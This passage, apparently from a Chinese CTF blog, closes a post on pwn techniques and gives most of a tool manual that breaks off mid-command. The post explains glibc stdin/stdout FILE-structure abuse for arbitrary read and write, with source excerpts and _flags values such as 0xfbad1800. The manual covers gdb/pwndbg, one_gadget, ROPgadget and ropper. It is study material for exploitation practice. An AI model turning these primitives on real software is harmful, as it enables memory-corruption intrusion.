class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i 0x400961</span><br><span class="line">   0x400961 &lt;__libc_csu_init+97&gt;:pop    rsi</span><br><span class="line">   0x400962 &lt;__libc_csu_init+98&gt;:pop    r15</span><br><span class="line">   0x400964 &lt;__libc_csu_init+100&gt;:ret </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /5i 0x400963</span><br><span class="line">   0x400963 &lt;__libc_csu_init+99&gt;:pop    rdi</span><br><span class="line">   0x400964 &lt;__libc_csu_init+100&gt;:ret</span><br></pre></td></tr></table></figure><p>可见偏移构造之后变成不同的gadget了</p><h1 id="标准io任意读写"><a href="#标准io任意读写" class="headerlink" title="标准io任意读写"></a>标准io任意读写</h1><h2 id="stdin任意写"><a href="#stdin任意写" class="headerlink" title="stdin任意写"></a>stdin任意写</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p><code>scanf</code>,<code>fread</code>,<code>gets</code>等读入走<code>IO</code>指针(<code>read</code>则不).</p><p>若输入缓冲区指针满足_IO_read_end ==_IO_read_ptr,即缓冲区中没有可供读取的数据时</p><p>会调用sysread读取数据至_IO_buf_base处,读取大小为__IO_buf_end-IO_buf_base</p><p>故若能够修改stdin的_IO_buf_base字段</p><p>并且满足</p><ol><li>设置<code>_IO_read_end</code>等于<code>_IO_read_ptr</code>（使得输入缓冲区内没有剩余数据，从而可以从用户读入数据）。</li><li>设置<code>_flag &amp;~ _IO_NO_READS</code>即<code>_flag &amp;~ 0x4</code>（一般不用特意设置）。</li><li>设置<code>_fileno</code>为<code>0</code>（一般不用特意设置）。</li><li>设置<code>_IO_buf_base</code>为<code>write_start</code>，<code>_IO_buf_end</code>为<code>write_end</code>（我们目标写的起始地址是<code>write_start</code>，写结束地址为<code>write_end</code>），且使得<code>_IO_buf_end-_IO_buf_base</code>大于要写入的数据长度。</li></ol><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>在大多数时候我们并无法做到任意修改_IO_buf_base(毕竟我们的目标就是获得任意写),</p><p>不过我们知道在<strong>无缓冲模式</strong>时,文件的缓冲区被设置为自身结构体内的_shortbuf</p><p>此时,如果具有单字节置零(或更自由的条件),那么可以将_IO_buf_base的<strong>最低字节置零</strong></p><p>使得_IO_buf_base指向结构体自身(当然需要确保_IO_buf_base和_shortbu的地址除最后一个字节外都要相同)</p><p>这样在读取时便会读取到自身结构体,此时再次修改_IO_buf_base和_IO_buf_end</p><p>并利用某些io函数(如getchar,可以使_IO_read_ptr++)再次使得_IO_read_end ==_IO_read_ptr</p><p>然后再次触发系统调用读取,就可以做到任意写</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>有些情况下,特别是无缓冲模式下,如果是由xgetsn触发的underflow,读取数大于缓冲区大小(无缓冲模式为1),会直接调用系统调用从文件流读到目标区域,而不经过缓冲区</p><p>其他模式下如果缓冲区大于128,才会有最后一部分经过缓冲区读取</p><h3 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h3><p><strong>2023hitctf-scanf</strong></p><p>见</p><blockquote><p>平时比赛题录.md</p></blockquote><h2 id="stdout任意读写"><a href="#stdout任意读写" class="headerlink" title="stdout任意读写"></a>stdout任意读写</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p><code>printf</code>,<code>fwrite</code>,<code>puts</code>等输出走<code>IO</code>指针(<code>write</code>则不)</p><h4 id="任意写"><a href="#任意写" class="headerlink" title="任意写"></a>任意写</h4><p>在行缓冲模式下，判断输出缓冲区还有多少空间，用的是<code>count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr</code>，而在全缓冲模式下，用的是<code>count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr</code>，若是还有空间剩余，则<u>会将要输出的数据复制到输出缓冲区中</u>（此时由<code>_IO_write_ptr</code>控制，向<code>_IO_write_ptr</code>拷贝<code>count</code>长度的数据），因此可通过这一点来实现任意地址写的功能。<br><strong>利用方式</strong>：以全缓冲模式为例，只需将<code>_IO_write_ptr</code>指向<code>write_start</code>，<code>_IO_write_end</code>指向<code>write_end</code>即可。</p><h4 id="任意读"><a href="#任意读" class="headerlink" title="任意读"></a>任意读</h4><p>先讨论<code>_IO_new_file_xsputn</code>源代码中<code>if (to_do + must_flush &gt; 0)</code>有哪些情况会执行该分支中的内容：<br>(a) 首先要明确的是<code>to_do</code>一定是非负数，因此若<code>must_flush</code>为<code>1</code>的时候就会执行该分支中的内容，而再往上看，当需要输出的内容中有<code>\n</code>换行符的时候就会需要刷新输出缓冲区，即将<code>must_flush</code>设为<code>1</code>，故当输出内容中有<code>\n</code>的时候就会执行该分支的内容，如用<code>puts</code>函数输出就一定会执行。<br>(b) 若<code>to_do</code>大于<code>0</code>，也会执行该分支中的内容，因此，当 输出缓冲区未建立 或者 输出缓冲区没有剩余空间 或者 输出缓冲区剩余的空间不够一次性将目标地址中的数据完全拷贝过来 的时候，也会执行该<code>if</code>分支中的内容。<br>而该<code>if</code>分支中主要调用了<code>_IO_OVERFLOW()</code>来刷新输出缓冲区，而在此过程中会调用<code>_IO_do_write()</code>输出我们想要的数据。<br>相关源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_new_file_overflow (_IO_FILE *f, <span class="type">int</span> ch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 判断标志位是否包含_IO_NO_WRITES =&gt; _flags需要不包含_IO_NO_WRITES</span></span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 判断输出缓冲区是否为空 以及 是否不包含_IO_CURRENTLY_PUTTING标志位</span></span><br><span class="line">  <span class="comment">// 为了不执行该if分支以免出错，最好定义 _flags 包含 _IO_CURRENTLY_PUTTING</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用_IO_do_write 输出 输出缓冲区</span></span><br><span class="line">  <span class="comment">// 从_IO_write_base开始，输出(_IO_write_ptr - f-&gt;_IO_write_base)个字节的数据</span></span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,</span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">char</span>) ch;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_file_overflow, _IO_file_overflow)</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> _IO_size_t <span class="title function_">new_do_write</span> <span class="params">(_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *data, _IO_size_t to_do)</span></span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  _IO_size_t count;</span><br><span class="line">  <span class="comment">// 为了不执行else if分支中的内容以产生错误，可构造_flags包含_IO_IS_APPENDING 或 设置_IO_read_end等于_IO_write_base</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_off64_t new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">// 调用函数输出输出缓冲区</span></span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do);</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上，为了做到<strong>任意读</strong>，满足如下条件，即可进行利用：</p><ol><li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>，即<code>_flag &amp;~ 0x8</code>；</li><li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>，即<code>_flag | 0x800</code>；</li><li>设置<code>_fileno</code>为<code>1</code>；</li><li>设置<code>_IO_write_base</code>指向想要泄露的地方，<code>_IO_write_ptr</code>指向泄露结束的地址；</li><li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code> 或 设置<code>_flag &amp; _IO_IS_APPENDING</code>即，<code>_flag | 0x1000</code>。</li><li>此外，有一个大前提：需要调用<code>_IO_OVERFLOW()</code>才行，因此需使<strong>得需要输出的内容中含有<code>\n</code>换行符</strong> 或 <strong>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code></strong>（输出缓冲区无剩余空间）等。一般来说，经常利用<code>puts</code>函数加上述<code>stdout</code>任意读的方式泄露<code>libc</code>。<code>_flag</code>的构造需满足的条件:</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span> </span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技巧 </tag>
            
            <tag> DynELF </tag>
            
            <tag> mprotect </tag>
            
            <tag> vsyscall </tag>
            
            <tag> setcontext </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具使用手册</title>
      <link href="/posts/26682/"/>
      <url>/posts/26682/</url>
      
        <content type="html"><![CDATA[<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><ul><li><p>[]表示直接输入</p></li><li><p>“”表示需由引号包裹</p></li><li>{}表示键盘操作</li></ul><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul><li><p><code>help [指令]</code>查看个指令的用法</p></li><li><p><code>i</code>即info  查看信息</p><ul><li><code>i b</code>查看断点</li><li><code>i r</code>查看寄存器</li><li><code>i f</code>查看函数名</li></ul></li><li><code>show</code>与info类似,但更多是调试信息</li><li><code>stack [数]</code>查看栈</li><li><code>backtrace</code>查看当前调试环境中所有<strong>栈帧的信息</strong>,栈回溯.</li><li><code>vmmap</code>内存段基本信息</li><li><code>frame</code>查看当前frame(函数,栈帧)里的变量值等信息</li><li><code>display /[n]i $pc</code>查看当前往下n行代码</li><li><code>disassemble *addr</code>反汇编某块内存,<code>disassemble /r</code>带机器码</li><li><code>distance</code>计算距离</li></ul><h3 id="随机化信息"><a href="#随机化信息" class="headerlink" title="随机化信息"></a>随机化信息</h3><ul><li><code>libc</code>打印libc基址</li><li><code>ld</code>打印ld基址</li><li><code>code</code>打印code基址</li><li><code>tls</code>打印tls地址</li><li><code>heapbase</code>打印heap基址</li></ul><h3 id="符号与源码"><a href="#符号与源码" class="headerlink" title="符号与源码"></a>符号与源码</h3><ul><li><p><code>info sharedlibrary</code>  查询符号表地址</p></li><li><p><code>add-symbol-file /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</code>加载符号文件,调试会有一些问题</p></li><li><p><code>dir</code>查看源码目录</p></li><li><p><code>dir 指定目录</code>指定查找源码目录,例如调试malloc源码</p></li></ul><hr><p>最后还有一种最有效的加载符号表方式</p><p>利用<strong>gdb的python api</strong>导入调试文件,稳定性最高,调试不出错</p><p>借助其api写成的loadsym.py实现</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(sh,<span class="string">&#x27;&#x27;&#x27;source ./libcdbg/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/libc-2.31.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>在2.34以前可以直接加载.debug目录下的对应符号文件,如以上所示</p><p>不过从2.34开始,提供的glibc符号文件格式发生变化,loadsym的对象也有一些变化</p><p>现在我们需要先file查看下载的libc.so的build-id,例如2.36-0ubuntu4_amd64的build-id是d1704d25fbbb72fa95d517b883131828c0883fe9,那么就前往.built-id文件夹寻找d1文件夹,找到其中的704d25fbbb72fa95d517b883131828c0883fe9.debug文件,将其加载</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(sh,<span class="string">&#x27;&#x27;&#x27;source ./libcdbg/loadsym.py</span></span><br><span class="line"><span class="string">loadsym /home/aichch/glibc-all-in-one/libs/2.36-0ubuntu4_amd64/.debug/.build-id/d1/704d25fbbb72fa95d517b883131828c0883fe9.debug</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>一般来说,ubuntu的同一个glibc版本的各个小版本的libc.so的符号差距不会太大,因此每个glibc版本有一个调试文件即可</p><p>不过特殊情况可能会出现符号较大差异,依然要调试的话可以下载指定版本的libc</p><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><ul><li><code>start</code>开始或重新开始</li><li><code>s [数]</code><strong>单步步入</strong>,会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong><ul><li><code>si [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>n [数]</code><strong>单步步过</strong>,不会进入子函数,数有填的话就是执行多少步,<strong>源码层面</strong><ul><li><code>ni [数]</code>同上,<strong>汇编层面</strong></li></ul></li><li><code>c</code>继续执行到断点，没断点就一直执行下去</li><li><code>&#123;ctrl+c&#125;</code>程序输入时强行中断</li><li><code>r</code>重新开始执行</li><li><code>finish(fi)</code>结束当前正在执行的函数，并在跳出函数后暂停程序的执行</li><li><code>return [值]</code>结束当前调用函数并返回指定值，到上一层函数调用处停止程序执行。</li><li><code>jump(j) [地址]</code>使程序从当前要执行的代码处，直接跳转到指定位置处继续执行后续的代码。即跳过部分代码</li><li><code>until(u)</code>单纯使用 until 命令，可以运行程序直到退出循环体。<ul><li><code>until n</code>命令中，n 为某一行代码的行号，该命令会使程序运行至第 n 行代码处停止。</li></ul></li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><ul><li><code>b *[地址]</code><ul><li><code>b *$ rebase([相对偏移])</code>开启pie时可用</li></ul></li><li><code>b [函数名]</code></li><li><code>b [数]</code>源码第几行断点</li><li><code>b +[数]</code>当前往下多少停住,同样可以有-</li><li><code>delete [数]</code>删除断点</li><li><code>disable [数]</code>禁用断点</li><li><code>enable [数]</code>启用断点</li><li><code>clear</code>清楚下面所有断点</li><li><code>watch [地址]</code>该地址数据改变时停下,例如<code>watch * (long long int*)0xdeadbeef</code>或者<code>watch &#123;long long int&#125;0xdeadbeef</code></li><li><code>watch [变量]</code>该变量改变的时候会断</li><li><code>info watchpoints</code> 查看watch断点信息</li><li><code>catch syscall</code> syscall系统调用的时候断住</li><li><code>tcatch syscall</code> syscall系统调用的时候断住，只断一次</li><li><code>info break</code> catch的断点可以通过i b查看</li></ul><h3 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h3><ol><li><code>search [值(多是字面值,字符串之类)]</code></li><li><code>find &quot;字符串&quot;</code>    pwndbg独有</li></ol><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><ul><li><p><code>x /[nuf]</code></p><ul><li><p>n代表几个单元</p></li><li><p>u代表每个单元几个字节(<strong>b—1</strong>|<strong>h—2</strong>|<strong>w—4</strong>|<strong>g—8</strong>)</p></li><li><p>f代表显示格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b 按字符显示。</span><br><span class="line">i 显示汇编指令</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>print(p) (&amp;)[符号]</code>打印符号的内容或查看符号的地址,支持进一步的指针调用,例如<code>p _rtld_global-&gt;_dl_ns-&gt;_ns_loaded-&gt;l_info[26]</code></p><ul><li><code>p (*(类型\*)内存地址)</code>,可以将某一块内存视为指定符号打印内容,例如<code>p (*(struct _IO_FILE_plus*)0x603180)</code></li></ul></li><li><p><code>telescope [内存|符号]</code>查看内容以更直观的方式</p></li><li><p><code>ptype [符号]</code>打印符号定义例如<code>ptype struct _IO_wide_data</code></p><ul><li><code>ptype /o</code>额外显示内部成员偏移</li></ul></li><li><p><code>hexdump</code>像debug那样显示内存</p></li></ul><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><ul><li><code>set $[寄存器]=[值]</code> 把寄存器的值变为所更改的</li><li><code>set *([地址])=[值]</code> 地址的值更改，<strong>注意带星号</strong>,默认int位数,例如<code>set * (long long int*)0xdeadbeef=0x123456789</code></li><li><code>set &#123;数据类型&#125;([地址])=[值]</code>地址的值修改(<strong>指定位数</strong>).<strong>不用星号</strong>.例如<code>set &#123;long long int&#125;0xdeadbeef=0x123456789</code></li><li><code>set args &quot;a1&quot; &quot;a2&quot; &quot;a3&quot;</code> 给参数123赋值</li><li><code>set args &quot;python3 -c &#39;print &quot;1234\x7f\xde&quot;&#39;&quot;&#39;</code> 使用python给参数赋值不可见字符</li></ul><h3 id="堆-pwndbg-独有"><a href="#堆-pwndbg-独有" class="headerlink" title="堆(pwndbg)独有"></a>堆(pwndbg)独有</h3><ul><li><code>mp</code>查看mmap详细信息，包括<strong>临界信息</strong>等</li><li><p><code>top_chunk</code>显示topchunk信息</p></li><li><p><code>arena</code> 显示当前arena的详细信息</p><ul><li><code>arenas</code> 显示所有arena的基本信息</li><li><code>arenainfo</code> <strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> </p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> 单独查看fastbins的链表情况</li><li><code>largebins</code> 同上，单独查看largebins的链表情况</li><li><code>smallbins</code> 同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> 同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> 同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> 查看tcache详细信息</li></ul></li><li><p><code>heap</code> </p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> <strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> 显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> 显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> <strong>好用</strong>，会跟提示所有操作堆的地方</p></li><li><p><code>malloc_chunk [chunk符号或地址]</code>查看该chunk的信息</p></li><li><p><code>find_fake_fast [地址] [大小]</code> 查找一块可以在给定地址附近伪造fake_fast_chunk的内存</p></li><li><p><code>vis</code>以数据块模式查看堆</p></li></ul><h3 id="其他-一些是pwndbg独有"><a href="#其他-一些是pwndbg独有" class="headerlink" title="其他(一些是pwndbg独有)"></a>其他(一些是pwndbg独有)</h3><ul><li><code>cyclic [数]</code> 生成用来溢出的字符<ul><li><code>cyclic -l [ 地址]</code>搭配使用</li></ul></li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> 断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> 打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>retaddr</code> 打印包含返回地址的栈地址</li><li><code>canary</code> 直接看canary的值</li><li><code>plt</code> 查看plt表</li><li><code>got</code> 查看got表</li><li><code>hexdump [地址] [数]</code> 像IDA那样显示数据，<strong>带字符串</strong></li><li><code>magic</code>打印一些useful符号</li></ul><h3 id="python-API"><a href="#python-API" class="headerlink" title="python-API"></a>python-API</h3><p>文档<a href="https://getdocs.org/Gdb/docs/latest/gdb/Python-API">Python API (Debugging with GDB)</a></p><p>在gdb命令行中,直接<code>python $gdb-function</code>即可使用</p><h3 id="善用help-命令"><a href="#善用help-命令" class="headerlink" title="善用help [命令]"></a>善用help [命令]</h3><h2 id="gdb-multiarch"><a href="#gdb-multiarch" class="headerlink" title="gdb-multiarch"></a>gdb-multiarch</h2><p><code>target remote : $port</code>连接调试端口</p><p><code>set architecture $arch</code>设置调试架构</p><p><code>set endian little/big</code>设置大小端</p><p><code>gdb-multiarch</code>启动的时候最好带上本地文件</p><p>调试异构时无法使用ctrl+c发送系统中断,因此只能打断点使程序停下</p><p>gdb-multiarch在程序崩溃时,偶尔会产生占用巨大空间的coredump文件</p><p>可以进入<code>/var/lib/apport/coredump</code>文件夹将其删除</p><h2 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h2><p><code>qemu-$arch -g $port -L $sharelib $file</code>qemu启动程序</p><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p><p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget &lt;FILE|-b BuildID&gt; [options]</span><br></pre></td></tr></table></figure><ol><li>如果是使用_malloc_hook来调用one_gadget，那么需要配合realloc来构造所需参数，realloc在libc中的符号是__libc_realloc</li><li>如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</li></ol><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><p><code>ROPgadget --binary filename --only &#39;pop|ret&#39;</code>搜索gadget</p><p><code>ROPgadget --binary filename --string &#39;/bin/sh&#39;</code>字符串</p><p>还有其他不少功能,详见help</p><h2 id="ropper"><a href="#ropper" class="headerlink" title="ropper"></a>ropper</h2><p>可以先使用<code>ropper</code>直接进入程序内部</p><p>再使用其他命令</p><h3 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h3><p>亦或者直接</p><p><code>ropper --file filename --string &#39;/bin/sh&#39;</code></p><p><code>ropper --file filename --search &#39;asm_code&#39;</code></p><p>指令可以指搜索部分例如<code>mov rdx</code>,也可以搜索更全<code>mov rdx, rdi</code>亦或者多条<code>mov rdx, rdi; mov rdi, rax;</code>要注意<strong>空格,逗号,分号</strong>的位置,不然搜不到</p><p><strong>?和%的用法:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[Search]</span><br><span class="line">./Ropper.py --file /bin/ls --search &lt;searchstring&gt;</span><br><span class="line">?     any character</span><br><span class="line">%     any string</span><br><span class="line"></span><br><span class="line">Example:</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov e?x&quot;</span><br><span class="line">0x000067f1: mov edx, dword ptr [ebp + 0x14]; mov dword ptr [esp], edx; call eax</span><br><span class="line">0x00006d03: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret ;</span><br><span class="line">0x00006d6f: mov ebx, esi; mov esi, dword ptr [esp + 0x18]; add esp, 0x1c; ret ;</span><br><span class="line">0x000076f8: mov eax, dword ptr [eax]; mov byte ptr [eax + edx], 0; add esp, 0x18; pop ebx; ret ;</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov [%], edx&quot;</span><br><span class="line">0x000067ed: mov dword ptr [esp + 4], edx; mov edx, dword ptr [ebp + 0x14]; mov dword ptr [esp], edx; call eax;</span><br><span class="line">0x00006f4e: mov dword ptr [ecx + 0x14], edx; add esp, 0x2c; pop ebx; pop esi; pop edi; pop ebp; ret ;</span><br><span class="line">0x000084b8: mov dword ptr [eax], edx; ret ;</span><br><span class="line">0x00008d9b: mov dword ptr [eax], edx; add esp, 0x18; pop ebx; ret ;</span><br><span class="line"></span><br><span class="line">./Ropper.py --file /bin/ls --search &quot;mov [%], edx&quot; --quality 1</span><br><span class="line">0x000084b8: mov dword ptr [eax], edx; ret ;; ret ;</span><br></pre></td></tr></table></figure><p>感觉比ROPgadget要好用一点</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>ropper还附带许多功能,例如asm和disasm等,不过用得比较多的还是gadget</p><p>更多详见说明文档</p><h2 id="linux自带"><a href="#linux自带" class="headerlink" title="linux自带"></a>linux自带</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">readelf 读取基本信息</span><br><span class="line">file  读取基本信息</span><br><span class="line">strings 读取文件字符串</span><br><span class="line">ldd  查看文件使用的libc库和ld链接器</span><br><span class="line">objdump 反汇编指令</span><br><span class="line">nm  列出符号表</span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th>工具</th><th>功能</th></tr></thead><tbody><tr><td>strace</td><td>跟踪程序执行过程中产生的系统调用及接收到的信号</td></tr><tr><td>readelf</td><td>用于查看ELF格式的文件信息</td></tr><tr><td>file</td><td>用于辨识文件类型</td></tr><tr><td>objdump</td><td>以一种可阅读的格式让你更多地了解二进制文件可能带有的附加信息</td></tr><tr><td>ldd</td><td>列出一个程序所需要得动态链接库</td></tr><tr><td>hexdump</td><td>hexdump主要用来查看“二进制”文件的十六进制编码</td></tr><tr><td>ar</td><td>创建静态库，插入/删除/列出/提取 成员函数</td></tr><tr><td>strings</td><td>列出目标文件中所有可打印的字符串</td></tr><tr><td>nm</td><td>列出目标文件中符号表所定义的符号</td></tr><tr><td>strip</td><td>从目标文件中删除符号表的信息</td></tr><tr><td>size</td><td>列出目标文件中各个段的大小</td></tr></tbody></table></div><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><p>ldd查看libc和ld路径(file和readelf指令也行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">linux:~/pwn$ ldd 